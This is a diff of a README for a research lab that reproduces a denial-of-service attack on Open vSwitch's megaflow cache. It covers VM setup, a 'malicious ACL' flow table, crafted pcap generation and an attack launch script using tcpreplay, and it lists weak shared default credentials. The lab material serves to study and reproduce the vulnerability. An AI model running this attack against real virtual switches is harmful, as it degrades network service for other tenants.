@@ -61,9 +61,9 @@ OVS installed from repository and OVS datapath came from the stock kernel module
 
 #### Clone repository
 ```
-$ git clone https://github.com/cslev/ovsdos
-$ git submodule update --init --recursive
-$ cd ovsdos/tools_for_measurement/
+git clone https://github.com/cslev/ovsdos
+git submodule update --init --recursive
+cd ovsdos/tools_for_measurement/
 ```
 
 #### Stop running OVS (if any)
@@ -87,7 +87,7 @@ will be added by initiating the VMs.
 #### Creating the VMs (from scratch)
  - install related packages (with the dependencies it requires)
 ```
-$ sudo apt-get install qemu-kvm qemu-system-common qemu-system-x86 qemu-utils virt-manager
+sudo apt-get install qemu-kvm qemu-system-common qemu-system-x86 qemu-utils virt-manager
 ```
  - download the provided [debian9.qcow](https://drive.google.com/file/d/1UA2iNO3YA_T52OPYn_bjFxHSXz0L905T/view?usp=sharing) image
  - create a VM with *virt-manager* (GUI, for brevity)
@@ -100,7 +100,7 @@ necessary later.
 
 We need to edit the created XML files manually to create new interfaces that will be attached to the OVS bridge.
 ```
-$ sudo virsh edit victim
+sudo virsh edit victim
 ```
  - Look for the interface description (hint: Ctrl+F: interface)
  - Add new interface below the one existing as follows:
@@ -116,6 +116,42 @@ $ sudo virsh edit victim
 Important part is the *type* set to **bridge**, and the *source* set to **ovsbr**.
 Choose different MAC addresses for the two interfaces to avoid MAC collision.
 Note: <address...> tag should be copied from the descriptor of the other interface as it might look different from the one above.
+**However, bear in mind that according to the *domain,bus,slot* and *function*, the primary and secondary interfaces might get swapped. This can result in the following:**
+ 1) that on the host system, your *vnet0* and *vnet1* will be used for the OVS port and for the NAT (internet access), respectively, not the other way around how this description assumes
+ 2) the default DHCP querying interface might not the right one (if it is configured), check */etc/network/interfaces* in each VM accordingly
+ 3) The flow rules corresponding to the interfaces and their order can also be swapped. Manual tweaking of */tools_for_measurement/simple_forwarding.flows* and */tools_for_measuremet/malicious_acl.flows* might be required. Once you have identified which *vnetX* interface is for what (i.e., for NAT and OVS port), use *ovs-ofctl show ovsbr* command to get the correct port identifiers. See example below:
+ ```
+ovs-ofctl show ovsbr
+
+OFPT_FEATURES_REPLY (xid=0x2): dpid:00001c34da5e0ed8
+n_tables:254, n_buffers:0
+capabilities: FLOW_STATS TABLE_STATS PORT_STATS QUEUE_STATS ARP_MATCH_IP
+actions: output enqueue set_vlan_vid set_vlan_pcp strip_vlan mod_dl_src mod_dl_dst mod_nw_src mod_nw_dst mod_nw_tos mod_tp_src mod_tp_dst
+ 1(vnet1): addr:fe:54:00:95:82:21
+     config:     0
+     state:      0
+     current:    10MB-FD COPPER
+     speed: 10 Mbps now, 0 Mbps max
+ 2(vnet3): addr:fe:54:00:63:5e:22
+     config:     0
+     state:      0
+     current:    10MB-FD COPPER
+     speed: 10 Mbps now, 0 Mbps max
+ 3(ens2): addr:1c:34:da:5e:0e:d8
+     config:     0
+     state:      0
+     current:    AUTO_NEG
+     advertised: 1GB-FD 10GB-FD AUTO_NEG AUTO_PAUSE
+     supported:  1GB-FD 10GB-FD AUTO_NEG AUTO_PAUSE
+     speed: 0 Mbps now, 10000 Mbps max
+ LOCAL(ovsbr): addr:1c:34:da:5e:0e:d8
+     config:     PORT_DOWN
+     state:      LINK_DOWN
+     speed: 0 Mbps now, 0 Mbps max
+OFPT_GET_CONFIG_REPLY (xid=0x4): frags=normal miss_send_len=0
+
+ ```
+ 
  - Save and exit
 
 This addition will instruct the VM to have a secondary virtual NIC that will be connected to the OVS bridge instance we have started in the first step (hence, the inportance of the bridge name *ovsbr*).
@@ -123,7 +159,7 @@ This addition will instruct the VM to have a secondary virtual NIC that will be 
 Now, your victim VM is ready. In order to have an attacker VM as well, just clone the whole system (via virt-manager or via virsh command)
  - name your cloned system as *attacker*
 ```
-$ sudo virt-clone --original victim --name attacker --auto-clone
+sudo virt-clone --original victim --name attacker --auto-clone
 ```
 
  - (edit XML and add a new interface for OVS as mentioned above, if it has not been cloned properly)
@@ -131,14 +167,14 @@ $ sudo virt-clone --original victim --name attacker --auto-clone
 
 #### Start your VMs via virsh:
 ```
-$ sudo virsh start victim
-$ sudo virsh start attacker
+sudo virsh start victim
+sudo virsh start attacker
 ```
 
 #### Access and configure the VMs
 Each VM has an SSH server installed for easy access, but you can use the virsh console 
 to access them:
-SSH user/pass = user/alskdj (then for root use the same password).
+**SSH user/pass = user/alskdj** (then for root use the same password).
 Alternatively, you can use virsh console to access the VMs (e.g., `$ sudo virsh console victim`)
 
 1) Login and update tooles
@@ -146,9 +182,9 @@ Login to each VM and update the repository of the required tools (if there is
 no update, you are good to go).
 In each VM, go to the downloaded github repo (mind `#` in the prompt, i.e., be *root* in the VM):
 ```
-# cd /root/ovsdos
-# git pull
-# git submodule update --remote --merge
+cd /root/ovsdos
+git pull
+git submodule update --remote --merge
 ```
 
 2) Configure interfaces in the VMs as follows:
@@ -164,18 +200,18 @@ Bring up physical interfaces on each server (our is named as *ens3f0* at both hy
 
 First, bring it up!
 ```
-$ sudo ifconfig ens3f0 up
+sudo ifconfig ens3f0 up
 ```
 
 Add to OVS:
 ```
-$ sudo ovs-vsctl add-port ovsbr ens3f0
+sudo ovs-vsctl add-port ovsbr ens3f0
 ```
 
 Disable NIC offloading and jumboframes on the physical interface to achieve the 'best' results in terms of service degradation (why? - in a nutshell, to not decrease substantially the packet per second processing requirements (details are in the paper)).
 ```
-# sudo apt-get install ethtool
-# sudo ethtool -K ens3f0 tx off rx off gso off gro off tso off (rso off)
+sudo apt-get install ethtool
+sudo ethtool -K ens3f0 tx off rx off gso off gro off tso off (rso off)
 ```
 
 If you have carried out the steps in the same chronological order, then your 
@@ -187,16 +223,19 @@ and port 3 to the hypervisor.
 ### Configure OVS bridges on both servers
 On the first hypervisor (*dione*), only basic flow rules are added to send traffic back 
 and forth. 
+
+**Bear in mind to tweak the *.flows* if necessary according to the vnetX devices and the order of ports added to OVS bridge**
+
 To reach this end:
 ```
-$ sudo ovs-ofctl add-flows ovsbr ovsdos/tools_for_measurements/simple_forwarding.flows
+sudo ovs-ofctl add-flows ovsbr ovsdos/tools_for_measurements/simple_forwarding.flows
 ```
 
 On the second hypervisor's (*titan*) OVS switch, install the specially crafted malicious 
 flow table as below.
 This contains the malicious ACL plus three simple flow rules (matching on the src and dst IPs and flooding ARPs, for brevity) for accommodating the victims' traffic between the servers.
 ```
-$ sudo ovs-ofctl add-flows ovsbr ovsdor/tools_for_measurements/malicious_acl.flows
+sudo ovs-ofctl add-flows ovsbr ovsdor/tools_for_measurements/malicious_acl.flows
 ```
 
 ### Visualizing the whole experiment for easier understanding
@@ -210,23 +249,23 @@ It might sound too fancy, but don't skip this step as further helper scripts ass
 
 Download *influxdb*:
 ```
-$ sudo curl -sL https://repos.influxdata.com/influxdb.key | sudo apt-key add -
-$ sudo  source /etc/lsb-release
-$ sudo echo "deb https://repos.influxdata.com/${DISTRIB_ID,,} ${DISTRIB_CODENAME} stable" | tee /etc/apt/sources.list.d/influxdb.list
+sudo curl -sL https://repos.influxdata.com/influxdb.key | sudo apt-key add -
+sudo  source /etc/lsb-release
+sudo echo "deb https://repos.influxdata.com/${DISTRIB_ID,,} ${DISTRIB_CODENAME} stable" | tee /etc/apt/sources.list.d/influxdb.list
 ```
 and install it:
 ```
-$ sudo apt-get update
-$ sudo apt-get install influxdb
+sudo apt-get update
+sudo apt-get install influxdb
 ```
 Start influxdb:
 ```
-$ sudo service influxdb start
+sudo service influxdb start
 ```
 
 Connect to influxdb via the cli to initialize the database:
 ```
-$ sudo influx
+sudo influx
 ```
 
 Create databases as follows:
@@ -249,8 +288,8 @@ Quit influx
 Install telegraf via the provided .deb file (or download another one for your 
 distribution):
 ```
-$ sudo  cd ovsdos/tools_for_measurements/
-$ sudo dpkg -i telegraf_0.10.2-1_amd64.deb
+sudo  cd ovsdos/tools_for_measurements/
+sudo dpkg -i telegraf_0.10.2-1_amd64.deb
 ```
 
 Open *telegraf.conf* and set your influxdb's url to *localhost:8086* (or any other 
@@ -266,14 +305,14 @@ Should be running by default after the installation
 
 Start the telegraf monitoring system:
 ```
-$ sudo telegraf -config telegraf.conf
+sudo telegraf -config telegraf.conf
 ```
 **OVS cache monitoring script**
 
 Start to monitor the cache-statistics of the OVS instance running on the second hypervisor (*titan*), where the malicious flow rules has been installed:
 ```
-$ sudo cd ovsdos/tools_for_measurements/
-$ sudo ./start_ovs_cache_log.sh
+sudo cd ovsdos/tools_for_measurements/
+sudo ./start_ovs_cache_log.sh
 ```
 
 
@@ -281,12 +320,12 @@ $ sudo ./start_ovs_cache_log.sh
 
 Download and run our containerized grafana image (available at dockerhub)
 ```
-$ sudo docker run -d --name ovsdos_grafana -p 3000:3000 cslev/ovsdos_grafana
+sudo docker run -d --name ovsdos_grafana -p 3000:3000 cslev/ovsdos_grafana
 ```
 OR if you have already done once before, a corresponding docker image will exist on your system.
 In this case, just start the container
 ```
-$ sudo docker start ovsdos_grafana
+sudo docker start ovsdos_grafana
 ```
 This will run the container in the background, exposing TCP port 3000 for (remote) web access.
 Grafana userinterface username/pass: admin/alskdj
@@ -305,7 +344,7 @@ On *titan*, login into *Victim2*.
 Start iperf server via the provided script (it will also send some data to *influxdb*, thereby making it visible in Grafana)
 ```
 sudo cd /root/ovsdos/tools_for_measurements/
-$ sudo ./start_iperf_server.sh
+sudo ./start_iperf_server.sh
 ```
 
 At the beginning, this will print out some meaningless error messages as below:
@@ -317,7 +356,7 @@ there is no measured data. Just ignore.
 On *dione* login/get into *Victim1*.
 Start iperf client in a relatively infinite loop (via -t 10000 option)
 ```
-$ sudo iperf3 -c 10.1.1.2 -t 10000
+sudo iperf3 -c 10.1.1.2 -t 10000
 ```
 Now, in *Victim2*, the error message should have disappeared and throughput data should show up in *Victim1* in the Grafana panel.
 
@@ -326,11 +365,11 @@ Finally, we have reached the attack part :)
 Now, we are ready to create some specially crafted packet sequence which will be then sent to the OVS instance running on the second hypervisor and will lead to a huge performance impact once subjected to the above malicious ACLs.
 Login to *Attacker1* (on *dione*) and create packet sequences as follows:
 ```
-$ sudo cd ovsdos/pcap_gen_ovs_dos
-$ sudo ./pcap_generator_for_holepunch.py -t DP -o DP
-$ sudo ./pcap_generator_for_holepunch.py -t SP_DP -o SP_DP
-$ sudo ./pcap_generator_for_holepunch.py -t SIP_SP_DP -o SIP_SP_DP
-$ sudo ./pcap_generator_for_holepunch.py -t SIP_DP -o SIP_DP
+sudo cd ovsdos/pcap_gen_ovs_dos
+sudo ./pcap_generator_for_holepunch.py -t DP -o DP
+sudo ./pcap_generator_for_holepunch.py -t SP_DP -o SP_DP
+sudo ./pcap_generator_for_holepunch.py -t SIP_SP_DP -o SIP_SP_DP
+sudo ./pcap_generator_for_holepunch.py -t SIP_DP -o SIP_DP
 ```
 Each *-t XX* corresponds to which header field is used to attack on which ACL rule/header field: **DP** attacks only on the *destination port* and should have minor impact, while **SIP_SP_DP** attacks on the *source IP*, the *source port* and the *destination port* at the same time and should cause a complete denial of service.
 
@@ -347,13 +386,13 @@ Since all VMs were configured in a way to have internet access, this should not 
 However, the IP address of *titan* needs to be defined for the scripts.
 To do this, open *start_attacker.sh* and set the *influx_server* variable properly.
 ```
-$ sudo cd ovsdos/tools_for_measurements/
-$ sudo  nano start_attacker.sh
+sudo cd ovsdos/tools_for_measurements/
+sudo  nano start_attacker.sh
 ```
 
 Then, launch the attack via the script as follows:
 ```
-$ sudo ./start_attacker.sh 100 ens3 ../pcap_gen_ovs_dos/SIP_DP.64bytes.pcap 64
+sudo ./start_attacker.sh 100 ens3 ../pcap_gen_ovs_dos/SIP_DP.64bytes.pcap 64
 ```
 
 Note that the first argument specifies the attacker's packet rate (*100 pps* (SIC!)); second argument defines the interface used to send the traffic (*ens3* in our running example); third argument is the location of the PCAP file, while the fourth is used to tell the script that the packet size in the PCAP is 64 bytes (this is used for calculating the attacker's sending throughput to visualize it in Grafana on *titan*).
@@ -372,7 +411,7 @@ sending rate is barely seen.
 #### Stop attack script 
 (via Ctrl+C) and for sure, try to kill *tcpreplay* manually, too.
 ```
-$ sudo pkill tcpreplay
+sudo pkill tcpreplay
 ```
 As the megaflow cache is back to normal (wait 10 secs at least as the entires have 10 secs of expiration time), CPU/softirq 
 load decreases, number of flows and masks returns to normal, an throughput becomes the usual (~10Gbit/s in our system).
